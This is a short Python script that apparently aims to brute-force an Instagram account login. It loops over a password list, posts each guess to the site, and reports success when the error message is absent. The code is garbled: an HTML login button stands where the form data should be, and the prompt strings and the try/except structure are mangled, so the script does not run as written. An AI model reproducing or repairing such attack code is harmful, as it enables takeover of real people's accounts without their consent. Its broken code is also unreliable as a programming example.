import requests
url = input("https://www.instagram.com: ")
username = input("spos: ")
error = input("Sorry, your password was incorrect. Please double-check your password.: ")
try:
    def bruteCracking(username,url,error):
        for password in passwords:
            password = password.strip()
            print("Trying:" + password)
            data_dict = {<button class="_acan _acap _acas" disabled="" type="submit"><div class="_ab8w  _ab94 _ab99 _ab9f _ab9m _ab9p">Log in</div></button>}
            response = requests.post(url, data=data_dict)
            if error in str(response.content):
               pass
            elif "csrf" in str(response.content):
                 print("CSRF Token Detected!! BruteF0rce Not Working This Website.")
                 exit()
            else:
                 print("Username: ---> " + username)
                 print("Password: ---> " + password)
                 exit()
except:
       print("Some Error Occurred Please Check Your Internet Connection !!")
with open("passwords.txt", "r") as passwords:
     bruteCracking(username,url,error)
print("[!!] password not found in password list")
